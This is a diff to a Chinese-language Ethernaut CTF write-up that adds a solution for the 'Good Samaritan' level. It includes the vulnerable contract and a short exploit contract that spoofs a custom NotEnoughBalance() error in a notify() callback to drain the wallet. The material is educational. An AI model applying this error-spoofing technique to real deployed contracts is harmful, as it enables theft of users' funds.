@@ -2257,7 +2257,7 @@ contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC2
 }
 ```
 
-- 传入 `CryptoVault.sweepToken()` 代币的地址不能等于 `underlying`，而若传入 `LegacyToken` 的地址，将调用 `delegateTransfer`，实际转移的是 `CryptoVault` 持有的 `DET` 代币，对应 `underlying`
+- 传入 `CryptoVault.sweepToken()` 代币的地址不能等于 `underlying`，而若传入 `LegacyToken` 的地址，将调用 `delegateTransfer()`，实际转移的是 `CryptoVault` 持有的 `DET` 代币，对应 `underlying`
 - 若 `origSender` 为 `CryptoVault` 的实例则 `raiseAlert`
 
     ```js
@@ -2287,3 +2287,137 @@ contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC2
 - [ABI Decode | Solidity by Example](https://solidity-by-example.org/abi-decode/)
 - [abi.decode cannot decode `msg.data` · Issue #6012 · ethereum/solidity](https://github.com/ethereum/solidity/issues/6012)
 - [TrueUSD ↔ Compound Vulnerability | by ChainSecurity | ChainSecurity | Medium](https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2)
+
+## 27. Good Samaritan
+
+清空 `Good Samaritan` 钱包的余额
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+import "openzeppelin-contracts-08/utils/Address.sol";
+
+contract GoodSamaritan {
+    Wallet public wallet;
+    Coin public coin;
+
+    constructor() {
+        wallet = new Wallet();
+        coin = new Coin(address(wallet));
+
+        wallet.setCoin(coin);
+    }
+
+    function requestDonation() external returns(bool enoughBalance) {
+        // donate 10 coins to requester
+        try wallet.donate10(msg.sender) {
+            return true;
+        } catch (bytes memory err) {
+            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+                // send the coins left
+                wallet.transferRemainder(msg.sender);
+                return false;
+            }
+        }
+    }
+}
+
+contract Coin {
+    using Address for address;
+
+    mapping(address => uint256) public balances;
+
+    error InsufficientBalance(uint256 current, uint256 required);
+
+    constructor(address wallet_) {
+        // one million coins for Good Samaritan initially
+        balances[wallet_] = 10**6;
+    }
+
+    function transfer(address dest_, uint256 amount_) external {
+        uint256 currentBalance = balances[msg.sender];
+
+        // transfer only occurs if balance is enough
+        if(amount_ <= currentBalance) {
+            balances[msg.sender] -= amount_;
+            balances[dest_] += amount_;
+
+            if(dest_.isContract()) {
+                // notify contract 
+                INotifyable(dest_).notify(amount_);
+            }
+        } else {
+            // a gas-efficient way :)
+            revert InsufficientBalance(currentBalance, amount_);
+        }
+    }
+}
+
+contract Wallet {
+    // The owner of the wallet instance
+    address public owner;
+
+    Coin public coin;
+
+    error OnlyOwner();
+    error NotEnoughBalance();
+
+    modifier onlyOwner() {
+        if(msg.sender != owner) {
+            revert OnlyOwner();
+        }
+        _;
+    }
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function donate10(address dest_) external onlyOwner {
+        // check balance left
+        if (coin.balances(address(this)) < 10) {
+            revert NotEnoughBalance();
+        } else {
+            // donate 10 coins
+            coin.transfer(dest_, 10);
+        }
+    }
+
+    function transferRemainder(address dest_) external onlyOwner {
+        // transfer balance left
+        coin.transfer(dest_, coin.balances(address(this)));
+    }
+
+    function setCoin(Coin coin_) external onlyOwner {
+        coin = coin_;
+    }
+}
+
+interface INotifyable {
+    function notify(uint256 amount) external;
+}
+```
+
+- 重复调用 `requestDonation()` 能够清空钱包的余额，但需要耗费大量的汽油 :(
+- 显然，调用 `Wallet.transferRemainder()` 是清空余额的最佳方法，需要触发错误 `NotEnoughBalance()`。由于错误能通过调用链传播，根据签名辨识（与函数调用类似），且不包含来源地址，可直接在 `notify()` 中触发
+
+    ```js
+    contract Notifyable is INotifyable {
+        error NotEnoughBalance();
+
+        function exploit(address instance) external {
+            GoodSamaritan(instance).requestDonation();
+        }
+
+        function notify(uint256 amount) external {
+            // 全部 revert 将导致交易失败
+            if (amount == 10) // 区分 donate10() 和 transferRemainder()
+                revert NotEnoughBalance();
+        } 
+    }
+    ```
+
+### 参考资料
+
+- [Custom Errors in Solidity | Solidity Blog](https://blog.soliditylang.org/2021/04/21/custom-errors/)
